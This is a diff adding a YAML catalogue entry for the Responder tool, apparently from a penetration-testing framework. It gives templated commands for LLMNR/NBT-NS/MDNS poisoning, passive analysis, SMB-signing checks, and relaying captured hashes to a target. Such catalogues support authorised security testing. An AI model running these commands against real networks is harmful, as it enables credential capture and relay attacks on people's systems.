@@ -1,0 +1,36 @@
+---
+name: responder
+description: An LLMNR, NBT-NS and MDNS poisoner
+os: Linux
+ptf_module: modules/exploitation/responder
+---
+commands:
+  - "Poison LLMNR, NBT-NS and MDNS, and Other Network Requests":
+    - type: ["bash","standalone"]
+    - text: "python Responder.py -I {STR}"
+    - input: ["interface name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Passively Analyze Network Requests for Future Poisioning":
+    - type: ["bash","standalone"]
+    - text: "python Responder.py -I {STR} -A"
+    - input: ["interface name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Check for SMB Signing":
+    - type: ["bash","standalone"]
+    - text: "python RunFinger.py -i {IPV4CIDR}"
+    - input: ["target class C IPv4 network, CIDR-notation"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Route Captured Network Hashes to Target":
+    - type: ["bash","standalone"]
+    - text: "python MultiRelay.py -t {IPV4} -u ALL"
+    - input: ["target IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
